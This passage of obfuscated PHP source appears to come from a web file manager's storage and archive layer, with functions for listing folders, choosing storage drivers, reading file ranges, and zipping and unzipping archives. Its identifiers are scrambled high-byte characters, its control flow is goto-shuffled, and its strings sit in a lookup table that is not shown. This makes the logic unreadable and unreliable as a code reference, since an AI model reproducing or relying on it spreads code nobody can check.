bµÀªäı“–; aﬁÀÌ’àÈ∆: $B‚øÑ≤ ˜Ó = self::_listAll($Câ¿Ì›π∂Ø); $bµˆÀà˜ê§ = self::_listAll($EÉÊíÍŸ†∂); $D”∫áπ»‚ë = array(); goto DÀÃŸò¿ë; DÀÃŸò¿ë: $fÕè‡§¿î≠ = array(); foreach ($B‚øÑ≤ ˜Ó as $Fõ≠¡’ºÕ° => $Bô¯ñ‚áÚü) { if (isset($bµˆÀà˜ê§[$Fõ≠¡’ºÕ°])) { if ($Bô¯ñ‚áÚü[$aíÚÉ°≠«Ë[86]] == 1) { continue; } if ($bµˆÀà˜ê§[$Fõ≠¡’ºÕ°][$aíÚÉ°≠«Ë[87]] == $Bô¯ñ‚áÚü[$aíÚÉ°≠«Ë[87]]) { continue; } } if ($Bô¯ñ‚áÚü[$aíÚÉ°≠«Ë[86]] == 1) { $fÕè‡§¿î≠[] = $EÉÊíÍŸ†∂ . $aíÚÉ°≠«Ë[8] . $Fõ≠¡’ºÕ°; continue; } $aØ¯À‹Ω‚¥ = strstr(trim($Fõ≠¡’ºÕ°, $aíÚÉ°≠«Ë[8]), $aíÚÉ°≠«Ë[8]) ? get_path_father($Fõ≠¡’ºÕ°) : $aíÚÉ°≠«Ë[33]; $D”∫áπ»‚ë[] = array($aíÚÉ°≠«Ë[992] => $Bô¯ñ‚áÚü[$aíÚÉ°≠«Ë[85]], $aíÚÉ°≠«Ë[993] => rtrim($EÉÊíÍŸ†∂, $aíÚÉ°≠«Ë[8]) . $aíÚÉ°≠«Ë[8] . $aØ¯À‹Ω‚¥, $aíÚÉ°≠«Ë[994] => $Bô¯ñ‚áÚü); } $Eé¡±±•≤° = array($aíÚÉ°≠«Ë[174] => $D”∫áπ»‚ë, $aíÚÉ°≠«Ë[86] => $fÕè‡§¿î≠); goto A» ∑¬É≤é; Eıﬁ≤∆ÀÇ¢: $aíÚÉ°≠«Ë =& $_SERVER[Æ¡î¢≠¯™]; if (!IO::exist($Câ¿Ì›π∂Ø)) { return !1; } if (!IO::exist($EÉÊíÍŸ†∂)) { IO::mkdir($EÉÊíÍŸ†∂); } goto aﬁÀÌ’àÈ∆; bµÀªäı“–: } private static function _listAll($e…–≠‰ßáÎ) { $eîƒ©√Œ†… =& $_SERVER[Æ¡î¢≠¯™]; $e…–≠‰ßáÎ = KodIO::clear($e…–≠‰ßáÎ); $E’Ÿ¶ÔîÓÒ = IO::listAll($e…–≠‰ßáÎ); foreach ($E’Ÿ¶ÔîÓÒ as &$Bæ¥–éµ¬â) { $EÜÏ≠ûùÇ§ = substr($Bæ¥–éµ¬â[$eîƒ©√Œ†…[85]], strlen($e…–≠‰ßáÎ)); $Bæ¥–éµ¬â[$eîƒ©√Œ†…[996]] = trim($EÜÏ≠ûùÇ§, $eîƒ©√Œ†…[8]); } return array_to_keyvalue($E’Ÿ¶ÔîÓÒ, $eîƒ©√Œ†…[996]); } public static function fileSubstr($B÷æŸÂ∆ú≤, $bïúÙÙêÃ≠, $f‰çá ÇÈﬁ = false) { goto Cö¡ë∑í©¶; Cö¡ë∑í©¶: $fùÆ©ÑÛÇÒ = self::driverMake($B÷æŸÂ∆ú≤); $DÒÇâ™à¯ô = $fùÆ©ÑÛÇÒ->size($B÷æŸÂ∆ú≤); $CÍƒäêãÈ§ = $bïúÙÙêÃ≠; goto Dû≥¬â⁄€‚; F§ππåÈˆ©: return $fùÆ©ÑÛÇÒ->fileSubstr($B÷æŸÂ∆ú≤, $bïúÙÙêÃ≠, $f‰çá ÇÈﬁ); goto c•À°ÿèµÃ; A¿÷‘‡¯Æã: if ($bïúÙÙêÃ≠ + $f‰çá ÇÈﬁ > $DÒÇâ™à¯ô) { $f‰çá ÇÈﬁ = $DÒÇâ™à¯ô - $bïúÙÙêÃ≠; } if ($f‰çá ÇÈﬁ <= 0) { return $_SERVER[Æ¡î¢≠¯™][33]; } if ($bïúÙÙêÃ≠ < 0 || $bïúÙÙêÃ≠ >= $DÒÇâ™à¯ô || $f‰çá ÇÈﬁ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\145\x52\145\x61\144\x20\145\x72\x72\x6f\162\x21\40\x73\164\x61\x72\x74\x3d{$bïúÙÙêÃ≠}\x3b\154\x65\156\147\x74\150\75{$f‰çá ÇÈﬁ}\x3b\x20\x73\x69\172\145\75{$DÒÇâ™à¯ô}\73"); } goto F§ππåÈˆ©; Dû≥¬â⁄€‚: $e’åäﬁÑﬂ≤ = $f‰çá ÇÈﬁ; if ($bïúÙÙêÃ≠ < 0) { $bïúÙÙêÃ≠ = $DÒÇâ™à¯ô + $bïúÙÙêÃ≠; } if ($f‰çá ÇÈﬁ === !1) { $f‰çá ÇÈﬁ = $DÒÇâ™à¯ô - $bïúÙÙêÃ≠; } goto A¿÷‘‡¯Æã; c•À°ÿèµÃ: } private static function driverMake(&$CœÀ∫Ù·êÃ) { goto E·Ãøé≈ÇÆ; aæ¿≥•∞Ω–: return $Dë¨Ìú·◊…; goto Fì‚œÙø€∏; FÜÔÜ–ÑÊ˘: if ($Cü–äÕ‹Ω‡[$FœëëÎ¥ŸÎ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Cü–äÕ‹Ω‡[$FœëëÎ¥ŸÎ[372]]]) { return !1; } $CœÀ∫Ù·êÃ = $Cü–äÕ‹Ω‡[$FœëëÎ¥ŸÎ[997]]; $Dë¨Ìú·◊… = self::driverGet($Cü–äÕ‹Ω‡, $CœÀ∫Ù·êÃ); goto aæ¿≥•∞Ω–; E·Ãøé≈ÇÆ: $FœëëÎ¥ŸÎ =& $_SERVER[Æ¡î¢≠¯™]; $Cü–äÕ‹Ω‡ = KodIO::parse($CœÀ∫Ù·êÃ); if (!self::$driverListSystem) { $eˆÂ∑˘∞ﬂ = Model($FœëëÎ¥ŸÎ[696])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($eˆÂ∑˘∞ﬂ, $FœëëÎ¥ŸÎ[372]); } goto FÜÔÜ–ÑÊ˘; Fì‚œÙø€∏: } private static function driverGet($aâ∞á•«ÔÎ, &$eªéˆøÏ≈Ø) { goto Dó±Ü©‰ìø; C©öêÇÍáà: $fôäÒãèõ√ = self::$driverCache[$c∂≤ÇÁãøŸ]; $fôäÒãèõ√->pathDriver = $d”ÕÁ÷◊´ﬂ; $fôäÒãèõ√->pathBase = $C„ÁÑﬂÂûÃ[33]; goto A·ù÷À¢¢ª; A·ù÷À¢¢ª: if (isset($c´·∂–Ã∂É[$C„ÁÑﬂÂûÃ[6]][$C„ÁÑﬂÂûÃ[1010]])) { $fôäÒãèõ√->pathBase = rtrim($c´·∂–Ã∂É[$C„ÁÑﬂÂûÃ[6]][$C„ÁÑﬂÂûÃ[1010]], $C„ÁÑﬂÂûÃ[8]) . $C„ÁÑﬂÂûÃ[8]; $eªéˆøÏ≈Ø = $fôäÒãèõ√->pathBase . ltrim($eªéˆøÏ≈Ø, $C„ÁÑﬂÂûÃ[8]); } $eªéˆøÏ≈Ø = $fôäÒãèõ√->getPath($eªéˆøÏ≈Ø); if (isset($aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[984]])) { $eªéˆøÏ≈Ø = $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[984]]; } goto D°¶Øèû√ä; D°¶Øèû√ä: $fôäÒãèõ√->path = $eªéˆøÏ≈Ø; return $fôäÒãèõ√; goto CÚÇ¥·∆Í; Dó±Ü©‰ìø: $C„ÁÑﬂÂûÃ =& $_SERVER[Æ¡î¢≠¯™]; $d”ÕÁ÷◊´ﬂ = $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[998]]; $eèë®©Â¥ì = $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[372]]; goto FÇò“€Î÷÷; FÇò“€Î÷÷: switch ($aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[29]]) { case KodIO::KOD_IO: $c´·∂–Ã∂É = self::$driverListSystem[$eèë®©Â¥ì]; break; case KodIO::KOD_SOURCE: $eªéˆøÏ≈Ø = $eèë®©Â¥ì . $eªéˆøÏ≈Ø; $c´·∂–Ã∂É = array($C„ÁÑﬂÂûÃ[999] => $C„ÁÑﬂÂûÃ[1000], $C„ÁÑﬂÂûÃ[6] => $aâ∞á•«ÔÎ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $D≠¶üﬁÉäÚ = $GLOBALS[$C„ÁÑﬂÂûÃ[1001]]; self::$driverListUser = array_to_keyvalue($D≠¶üﬁÉäÚ, $C„ÁÑﬂÂûÃ[372]); } $c´·∂–Ã∂É = self::$driverListUser[$eèë®©Â¥ì]; break; case KodIO::KOD_SHARE_LINK: $c´·∂–Ã∂É = array($C„ÁÑﬂÂûÃ[999] => $C„ÁÑﬂÂûÃ[1002], $C„ÁÑﬂÂûÃ[6] => $aâ∞á•«ÔÎ); $f„¨¯∏Êèı = Action($C„ÁÑﬂÂûÃ[1003])->sharePathInfo($aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[85]]); $eªéˆøÏ≈Ø = $f„¨¯∏Êèı[$C„ÁÑﬂÂûÃ[374]]; if (!$f„¨¯∏Êèı[$C„ÁÑﬂÂûÃ[374]]) { $EÏ∂§ìöÎú = Model($C„ÁÑﬂÂûÃ[540])->getInfo($f„¨¯∏Êèı[$C„ÁÑﬂÂûÃ[445]]); $eªéˆøÏ≈Ø = KodIO::clear($EÏ∂§ìöÎú[$C„ÁÑﬂÂûÃ[1004]] . $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[997]]); $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[443]] = $EÏ∂§ìöÎú; $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[984]] = $eªéˆøÏ≈Ø; $c´·∂–Ã∂É = array($C„ÁÑﬂÂûÃ[999] => $C„ÁÑﬂÂûÃ[1005], $C„ÁÑﬂÂûÃ[6] => $aâ∞á•«ÔÎ); } break; case KodIO::KOD_SHARE_ITEM: $c´·∂–Ã∂É = array($C„ÁÑﬂÂûÃ[999] => $C„ÁÑﬂÂûÃ[1006], $C„ÁÑﬂÂûÃ[6] => $aâ∞á•«ÔÎ); $EÏ∂§ìöÎú = Model($C„ÁÑﬂÂûÃ[540])->getInfo($aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[372]]); if ($EÏ∂§ìöÎú[$C„ÁÑﬂÂûÃ[374]] == $C„ÁÑﬂÂûÃ[472]) { $eªéˆøÏ≈Ø = KodIO::clear($EÏ∂§ìöÎú[$C„ÁÑﬂÂûÃ[1004]] . $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[997]]); $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[443]] = $EÏ∂§ìöÎú; $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[984]] = $eªéˆøÏ≈Ø; $c´·∂–Ã∂É = array($C„ÁÑﬂÂûÃ[999] => $C„ÁÑﬂÂûÃ[1007], $C„ÁÑﬂÂûÃ[6] => $aâ∞á•«ÔÎ); } break; default: $eªéˆøÏ≈Ø = $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[85]]; $c´·∂–Ã∂É = array($C„ÁÑﬂÂûÃ[999] => $C„ÁÑﬂÂûÃ[1008]); break; } $c∂≤ÇÁãøŸ = $aâ∞á•«ÔÎ[$C„ÁÑﬂÂûÃ[85]]; if (!isset(self::$driverCache[$c∂≤ÇÁãøŸ])) { $D€÷ê’±¿≥ = strtolower($c´·∂–Ã∂É[$C„ÁÑﬂÂûÃ[100]]); $C∆àÙõÚ∞› = $GLOBALS[$C„ÁÑﬂÂûÃ[6]][$C„ÁÑﬂÂûÃ[94]][$C„ÁÑﬂÂûÃ[1009]]; $añá‚‰∏⁄ê = $C„ÁÑﬂÂûÃ[81] . (isset($C∆àÙõÚ∞›[$D€÷ê’±¿≥]) ? $C∆àÙõÚ∞›[$D€÷ê’±¿≥] : ucfirst($D€÷ê’±¿≥)); if (!class_exists($añá‚‰∏⁄ê)) { show_json("{$añá‚‰∏⁄ê}\x20\156\x6f\x74\x20\145\170\151\163\x74\163\x21", !1); } $C˜…øø–Óô = isset($c´·∂–Ã∂É[$C„ÁÑﬂÂûÃ[6]]) ? $c´·∂–Ã∂É[$C„ÁÑﬂÂûÃ[6]] : !1; self::$driverCache[$c∂≤ÇÁãøŸ] = new $añá‚‰∏⁄ê($C˜…øø–Óô); } goto C©öêÇÍáà; CÚÇ¥·∆Í: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $DÉÖØÃÔ‹µ; if (!$DÉÖØÃÔ‹µ) { $fÆñçúÆºº = IO::init($_SERVER[Æ¡î¢≠¯™][8]); } return $fÆñçúÆºº; } private static function iconvSystem($aØ¬ÜÎßΩÆ) { return self::local()->iconvSystem($aØ¬ÜÎßΩÆ); } private static function iconvApp($DÀΩ¥ç´÷Ù) { return self::local()->iconvApp($DÀΩ¥ç´÷Ù); } public static function zip($D⁄Ëï¡ô£ƒ, $F•“äıÍ¿  = "\x7a\x69\x70", $F≤ıÏ„Àâ÷ = '', $B∑À˘éΩêÇ = REPEAT_RENAME) { goto f√íÜïë≠; DÚ‰àÌ¶≠æ: if (!$aé ΩÙË¬®) { del_dir($céø¡ÙßÁ™); show_json(LNG($D‰ÚÙô≤íö[1013]), !1); } del_dir($céø¡ÙßÁ™); return $aé ΩÙË¬®; goto f°ÿÓß¬¥≤; d⁄°æ‚‹Ú´: if (count($e»¢≤ÑÏ¨) > 1) { $D·πëø‹Ω• = IO::info(IO::pathFather($e‰Ææ˘ﬂª†[$D‰ÚÙô≤íö[85]])); $e·Ç¨îŸû≥ = $D·πëø‹Ω•[$D‰ÚÙô≤íö[28]]; } $B≤èáâøË⁄ = $céø¡ÙßÁ™; if (!$B≤èáâøË⁄) { $B≤èáâøË⁄ = get_path_father($e‰Ææ˘ﬂª†[$D‰ÚÙô≤íö[85]]); $A◊≠ã∆œ–“ = IO::info($B≤èáâøË⁄); if (!$A◊≠ã∆œ–“[$D‰ÚÙô≤íö[196]]) { show_json(LNG($D‰ÚÙô≤íö[1012]), !1); } } goto E¢ä»ã¯è; cº ‡ééªË: if ($F≤ıÏ„Àâ÷ || !$céø¡ÙßÁ™) { if ($céø¡ÙßÁ™ && strstr($céø¡ÙßÁ™, TEMP_FILES)) { $b±ÕÊ´Û¨ = $e»¢≤ÑÏ¨ = array(); recursion_dir($B≤èáâøË⁄, $b±ÕÊ´Û¨, $e»¢≤ÑÏ¨, 0); foreach ($b±ÕÊ´Û¨ as $Cáé◊—ì»≈) { del_dir($Cáé◊—ì»≈); } foreach ($e»¢≤ÑÏ¨ as $e°ÍäŸÊø®) { if ($e°ÍäŸÊø® == $DèíäÓõÿä) { continue; } del_file($e°ÍäŸÊø®); } } return $Fƒ‘ìùÉ©¡; } $Eç¶âÊÑ∞æ = self::pathFather($e‰Ææ˘ﬂª†[$D‰ÚÙô≤íö[85]]); $aé ΩÙË¬® = self::move($Fƒ‘ìùÉ©¡, $Eç¶âÊÑ∞æ, $B∑À˘éΩêÇ); goto DÚ‰àÌ¶≠æ; eÖ£ﬂØè˘ú: $céø¡ÙßÁ™ = !1; if (!$F≤ıÏ„Àâ÷ && $D∂‹ŒƒËàà->getType() == $D‰ÚÙô≤íö[113]) { $e»¢≤ÑÏ¨ = self::zipFileList($D⁄Ëï¡ô£ƒ); } else { $céø¡ÙßÁ™ = $F≤ıÏ„Àâ÷ ? $F≤ıÏ„Àâ÷ : TEMP_FILES . $D‰ÚÙô≤íö[1011] . time() . rand_string(8) . $D‰ÚÙô≤íö[8]; mk_dir($céø¡ÙßÁ™); $e»¢≤ÑÏ¨ = self::zipFileList($D⁄Ëï¡ô£ƒ, $céø¡ÙßÁ™); } $e·Ç¨îŸû≥ = $e‰Ææ˘ﬂª†[$D‰ÚÙô≤íö[28]]; goto d⁄°æ‚‹Ú´; f√íÜïë≠: $D‰ÚÙô≤íö =& $_SERVER[Æ¡î¢≠¯™]; $D∂‹ŒƒËàà = self::init($D⁄Ëï¡ô£ƒ[0][$D‰ÚÙô≤íö[85]]); $e‰Ææ˘ﬂª† = self::info($D⁄Ëï¡ô£ƒ[0][$D‰ÚÙô≤íö[85]]); goto eÖ£ﬂØè˘ú; cò†≈äè¯ö: foreach ($e»¢≤ÑÏ¨ as $Aèàãê‹™Ø => $fÍÿ¯Ÿ≥Ôª) { $e»¢≤ÑÏ¨[$Aèàãê‹™Ø] = self::iconvSystem($fÍÿ¯Ÿ≥Ôª); } KodArchive::create($DèíäÓõÿä, $e»¢≤ÑÏ¨); if (!IO::exist($Fƒ‘ìùÉ©¡)) { if ($céø¡ÙßÁ™) { del_dir($céø¡ÙßÁ™); } show_json(LNG($D‰ÚÙô≤íö[1013]), !1); } goto cº ‡ééªË; E¢ä»ã¯è: $Fƒ‘ìùÉ©¡ = $B≤èáâøË⁄ . $e·Ç¨îŸû≥ . $D‰ÚÙô≤íö[103] . $F•“äıÍ¿ ; $Fƒ‘ìùÉ©¡ = get_filename_auto($Fƒ‘ìùÉ©¡, $D‰ÚÙô≤íö[33], $B∑À˘éΩêÇ); $DèíäÓõÿä = self::iconvSystem($Fƒ‘ìùÉ©¡); goto cò†≈äè¯ö; f°ÿÓß¬¥≤: } public static function unzip($F’äÜÒ„õè, $e‘∏Îπ«éÂ = "\162\145\x70\x6c\x61\x63\145") { goto aÂÍß¯íúı; a†’≥»ÜîÆ: $Cé∫é»òµô = self::tmpFileName($fÍ∏ •∞Ú¢); $bÊÛú≤ìƒÏ = TEMP_FILES . $Cé∫é»òµô; del_dir($bÊÛú≤ìƒÏ); goto bÇê∆Ã≠„î; CÎç˜‘á›€: if (!($fÍ∏ •∞Ú¢ = parent::info($bÖ∞¶“¯çƒ))) { show_json(LNG($f–ƒúß¿Ã‹[1015]), !1); } if (!($EÛ∏ÙÏÉñ∫ = parent::infoFull($Bãé„íÈßí))) { $Bãé„íÈßí = parent::mkdir($Bãé„íÈßí); $EÛ∏ÙÏÉñ∫ = array($f–ƒúß¿Ã‹[85] => $Bãé„íÈßí); } else { if (isset($EÛ∏ÙÏÉñ∫[$f–ƒúß¿Ã‹[374]]) && trim($EÛ∏ÙÏÉñ∫[$f–ƒúß¿Ã‹[85]], $f–ƒúß¿Ã‹[8]) != trim($Bãé„íÈßí, $f–ƒúß¿Ã‹[8])) { $EÙº≥˘å⁄ê = KodIO::make($EÛ∏ÙÏÉñ∫[$f–ƒúß¿Ã‹[465]]); $cé•¥âƒ“ì = parent::fileNameAuto($EÙº≥˘å⁄ê, $EÛ∏ÙÏÉñ∫[$f–ƒúß¿Ã‹[28]], REPEAT_RENAME_FOLDER, !0); $Bãé„íÈßí = parent::mkdir($EÙº≥˘å⁄ê . $cé•¥âƒ“ì); $EÛ∏ÙÏÉñ∫ = array($f–ƒúß¿Ã‹[85] => $Bãé„íÈßí); } } $Bãé„íÈßí = $EÛ∏ÙÏÉñ∫[$f–ƒúß¿Ã‹[85]]; goto a†’≥»ÜîÆ; fﬂ¬®Ñ√Ëü: $cÆçŒ˜„Îù = KodArchive::extract($f£ˆà¢áœç, $bÊÛú≤ìƒÏ . $f–ƒúß¿Ã‹[8], $DØﬁàéœü•); self::archiveExt(); if (!$cÆçŒ˜„Îù[$f–ƒúß¿Ã‹[1018]]) { show_json($f–ƒúß¿Ã‹[1019] . $cÆçŒ˜„Îù[$f–ƒúß¿Ã‹[1020]], !1); } goto e‹≤πòÒ”ç; AÕ©†‰Ê§Ü: return !0; goto Cì»ﬁ–⁄¶Õ; aÚéë¨åÜÇ: foreach ($Cæ¨âè®Ãû as $f¯˘öÑ≤ßÂ) { $f¯˘öÑ≤ßÂ = self::iconvApp($f¯˘öÑ≤ßÂ); self::move($f¯˘öÑ≤ßÂ, $Bãé„íÈßí, $e‘∏Îπ«éÂ); } del_dir($bÊÛú≤ìƒÏ); if (!$dùó¿ê÷Áà) { del_file($f£ˆà¢áœç); } goto AÕ©†‰Ê§Ü; e‹≤πòÒ”ç: Hook::trigger($f–ƒúß¿Ã‹[1021], $bÊÛú≤ìƒÏ); recursion_dir($bÊÛú≤ìƒÏ, $DéâêÑ≥è≤, $CŸ∞¥°Ë’ª, 0); $Cæ¨âè®Ãû = array_merge($DéâêÑ≥è≤, $CŸ∞¥°Ë’ª); goto aÚéë¨åÜÇ; aÂÍß¯íúı: $f–ƒúß¿Ã‹ =& $_SERVER[Æ¡î¢≠¯™]; $bÖ∞¶“¯çƒ = $F’äÜÒ„õè[$f–ƒúß¿Ã‹[85]]; $Bãé„íÈßí = $F’äÜÒ„õè[$f–ƒúß¿Ã‹[1014]]; goto CÎç˜‘á›€; bÇê∆Ã≠„î: mk_dir($bÊÛú≤ìƒÏ); $e€Çïœ¥âÏ = self::fileExt($fÍ∏ •∞Ú¢); $f£ˆà¢áœç = $bÊÛú≤ìƒÏ . $f–ƒúß¿Ã‹[103] . $e€Çïœ¥âÏ; goto f‘‰“Û‘ÿ∏; f‘‰“Û‘ÿ∏: if (!@file_exists(self::iconvSystem($f£ˆà¢áœç))) { $dùó¿ê÷Áà = self::localFilePath($bÖ∞¶“¯çƒ, $e€Çïœ¥âÏ); $f£ˆà¢áœç = $dùó¿ê÷Áà ? $dùó¿ê÷Áà : parent::download($bÖ∞¶“¯çƒ, $f£ˆà¢áœç); } $f£ˆà¢áœç = self::iconvSystem($f£ˆà¢áœç); $DØﬁàéœü• = isset($F’äÜÒ„õè[$f–ƒúß¿Ã‹[1016]]) ? $F’äÜÒ„õè[$f–ƒúß¿Ã‹[1016]] : $f–ƒúß¿Ã‹[1017]; goto fﬂ¬®Ñ√Ëü; Cì»ﬁ–⁄¶Õ: } public static function unzipList($cé ÙﬂÈ±É) { goto DÇÿä”Î…¯; EÊÙõ’•Û‚: $fÎçÌ—è–ƒ = json_encode($AÃÕëïÒøÀ[$a’Ú…™‡¬[1020]]); self::setContent($e‘Êóú§Üª, $fÎçÌ—è–ƒ); if (count($AÃÕëïÒøÀ[$a’Ú…™‡¬[1020]]) >= $CÑÚÁ–¥ºÂ) { show_json(sprintf(LNG($a’Ú…™‡¬[1024]), count($AÃÕëïÒøÀ[$a’Ú…™‡¬[1020]])), !1); } goto BÏí¢æ§‚’; d∆⁄µ∂ˆä¨: if (isset($eà∏•»ÏÙâ)) { $AªÆñóœ†“ = array($eà∏•»ÏÙâ[$a’Ú…™‡¬[85]], $eà∏•»ÏÙâ[$a’Ú…™‡¬[1022]], $eà∏•»ÏÙâ[$a’Ú…™‡¬[28]]); $e‘õÙ£Çîı = md5(implode($a’Ú…™‡¬[80], $AªÆñóœ†“)) . $a’Ú…™‡¬[103] . get_path_ext($eà∏•»ÏÙâ[$a’Ú…™‡¬[28]]); } else { $AªÆñóœ†“ = array($d≠èëúÖÖ◊[$a’Ú…™‡¬[28]], $d≠èëúÖÖ◊[$a’Ú…™‡¬[85]], $d≠èëúÖÖ◊[$a’Ú…™‡¬[87]]); $e‘õÙ£Çîı = md5(implode($a’Ú…™‡¬[80], $AªÆñóœ†“)) . $a’Ú…™‡¬[103] . $B”á‰ìöô∑; } if ($fÃÎÖûó≈≠ == -1) { $e‘Êóú§Üª = IO_PATH_SYSTEM_TEMP . "\172\x69\160\126\151\x65\167\57{$d˘≤¢ä´Œ†}\x2f{$e‘õÙ£Çîı}\x2e\154\x6f\x67"; $fã≤»†∞ÿ« = self::infoFull($e‘Êóú§Üª); if ($fã≤»†∞ÿ«) { $e‘Êóú§Üª = $fã≤»†∞ÿ«[$a’Ú…™‡¬[85]]; $aÜ™àﬂÎ‰Î = self::getContent($e‘Êóú§Üª); if ($aÜ™àﬂÎ‰Î) { $fÎçÌ—è–ƒ = json_decode($aÜ™àﬂÎ‰Î, !0); if (count($fÎçÌ—è–ƒ) >= $CÑÚÁ–¥ºÂ) { show_json(sprintf(LNG($a’Ú…™‡¬[1024]), count($fÎçÌ—è–ƒ)), !1); } return $fÎçÌ—è–ƒ; } } else { $e‘Êóú§Üª = self::mkfile($e‘Êóú§Üª); } } $aÜ£ôÍ›ª– = TEMP_FILES . $d˘≤¢ä´Œ†; goto D¬‡Ø¯√Ô‹; D¬‡Ø¯√Ô‹: if (!is_dir($aÜ£ôÍ›ª–)) { mk_dir($aÜ£ôÍ›ª–); } $FÀ›©Õäèæ = $aÜ£ôÍ›ª– . $a’Ú…™‡¬[8] . $e‘õÙ£Çîı; if (!@file_exists(self::iconvSystem($FÀ›©Õäèæ))) { if (isset($eà∏•»ÏÙâ)) { url_request($CéÖ¯¡ ç‰, $a’Ú…™‡¬[1025], $FÀ›©Õäèæ); } else { $FÓ…ïãªÌ = self::localFilePath($CéÖ¯¡ ç‰, $B”á‰ìöô∑); $FÀ›©Õäèæ = $FÓ…ïãªÌ ? $FÓ…ïãªÌ : self::download($CéÖ¯¡ ç‰, $FÀ›©Õäèæ); } } goto e„ëè√ ª∫; e„ëè√ ª∫: $FÀ›©Õäèæ = self::iconvSystem($FÀ›©Õäèæ); if ($fÃÎÖûó≈≠ >= 0) { $FﬂÈÂ∑øä° = isset($cé ÙﬂÈ±É[$a’Ú…™‡¬[1026]]) ? $cé ÙﬂÈ±É[$a’Ú…™‡¬[1026]] : !1; $fºÖΩ…‘îà = isset($cé ÙﬂÈ±É[$a’Ú…™‡¬[28]]) ? $cé ÙﬂÈ±É[$a’Ú…™‡¬[28]] : $a’Ú…™‡¬[33]; KodArchive::filePreview($FÀ›©Õäèæ, $fÃÎÖûó≈≠, $FﬂÈÂ∑øä°, $fºÖΩ…‘îà); self::archiveExt(); die; } $AÃÕëïÒøÀ = KodArchive::listContent($FÀ›©Õäèæ); goto Bã…Œó¬ï‚; a¿ê≤àÀ⁄±: $d≠èëúÖÖ◊ = self::info($E‘çÙäÇ≠ô); $B”á‰ìöô∑ = self::fileExt($d≠èëúÖÖ◊); $d˘≤¢ä´Œ† = self::tmpFileName($d≠èëúÖÖ◊); goto d∆⁄µ∂ˆä¨; DÇÿä”Î…¯: $a’Ú…™‡¬ =& $_SERVER[Æ¡î¢≠¯™]; $CéÖ¯¡ ç‰ = $cé ÙﬂÈ±É[$a’Ú…™‡¬[85]]; $fÃÎÖûó≈≠ = isset($cé ÙﬂÈ±É[$a’Ú…™‡¬[1022]]) ? $cé ÙﬂÈ±É[$a’Ú…™‡¬[1022]] : -1; goto eêêõ≤øÑΩ; BÏí¢æ§‚’: return $AÃÕëïÒøÀ[$a’Ú…™‡¬[1020]]; goto Bπç†•’Ç≈; Bã…Œó¬ï‚: self::archiveExt(); del_dir($aÜ£ôÍ›ª–); if (!$AÃÕëïÒøÀ[$a’Ú…™‡¬[1018]]) { show_json($AÃÕëïÒøÀ[$a’Ú…™‡¬[1020]], !1); } goto EÊÙõ’•Û‚; eêêõ≤øÑΩ: $CÑÚÁ–¥ºÂ = 50000; if (request_url_safe($CéÖ¯¡ ç‰)) { $eà∏•»ÏÙâ = parse_url_query($CéÖ¯¡ ç‰); if (!isset($eà∏•»ÏÙâ[$a’Ú…™‡¬[85]])) { show_json($a’Ú…™‡¬[1023], !1); } } $E‘çÙäÇ≠ô = isset($eà∏•»ÏÙâ) ? $eà∏•»ÏÙâ[$a’Ú…™‡¬[85]] : $CéÖ¯¡ ç‰; goto a¿ê≤àÀ⁄±; Bπç†•’Ç≈: } private static function fileExt($AêÖ“¯‰’Û) { $dûﬁÆ¯π‚∞ =& $_SERVER[Æ¡î¢≠¯™]; $E∂É¿¨ö‘ã = $AêÖ“¯‰’Û[$dûﬁÆ¯π‚∞[167]]; if ($E∂É¿¨ö‘ã == $dûﬁÆ¯π‚∞[1027]) { $f¥›Ü¿≤ﬂÜ = $dûﬁÆ¯π‚∞[1028]; if (substr($AêÖ“¯‰’Û[$dûﬁÆ¯π‚∞[28]], -strlen($f¥›Ü¿≤ﬂÜ)) == $f¥›Ü¿≤ﬂÜ) { $E∂É¿¨ö‘ã = $dûﬁÆ¯π‚∞[1029]; } } self::archiveExt($E∂É¿¨ö‘ã); return $E∂É¿¨ö‘ã; } private static function zipFileList($F‰∑è¶Â∏ß, $DÌÌ∞∂§ﬂ… = false) { $EòÍ«ﬁ·ÑÎ =& $_SERVER[Æ¡î¢≠¯™]; $dùôƒÆÍèâ = array(); foreach ($F‰∑è¶Â∏ß as $Eò·°Ù∆°≈) { $AÊË ∂ÁÙ‡ = $Eò·°Ù∆°≈[$EòÍ«ﬁ·ÑÎ[85]]; if ($DÌÌ∞∂§ﬂ…) { $AÊË ∂ÁÙ‡ = self::copy($Eò·°Ù∆°≈[$EòÍ«ﬁ·ÑÎ[85]], $DÌÌ∞∂§ﬂ…, $EòÍ«ﬁ·ÑÎ[736]); } if ($AÊË ∂ÁÙ‡ && self::local()->exist($AÊË ∂ÁÙ‡)) { $dùôƒÆÍèâ[$Eò·°Ù∆°≈[$EòÍ«ﬁ·ÑÎ[85]]] = $AÊË ∂ÁÙ‡; } } if (!empty($dùôƒÆÍèâ)) { return array_values($dùôƒÆÍèâ); } show_json(LNG($EòÍ«ﬁ·ÑÎ[1030]), !1); } public static function tmpFileName($e§ÇËËá«) { $aÇ›æå¡‘û =& $_SERVER[Æ¡î¢≠¯™]; $cáû∆ÿºΩì = array($e§ÇËËá«[$aÇ›æå¡‘û[28]], $e§ÇËËá«[$aÇ›æå¡‘û[85]], $e§ÇËËá«[$aÇ›æå¡‘û[87]], $e§ÇËËá«[$aÇ›æå¡‘û[463]]); return md5(implode($aÇ›æå¡‘û[80], $cáû∆ÿºΩì)); } private static function localFilePath($cˆàüñ¡⁄∏, $FÊÀöäéé©) { goto bõë…—Çæ‡; c Ïﬁ‚ıøí: if ($Bä©≠Ë«çØ[$A¨…ûÏË¶¿[29]] == 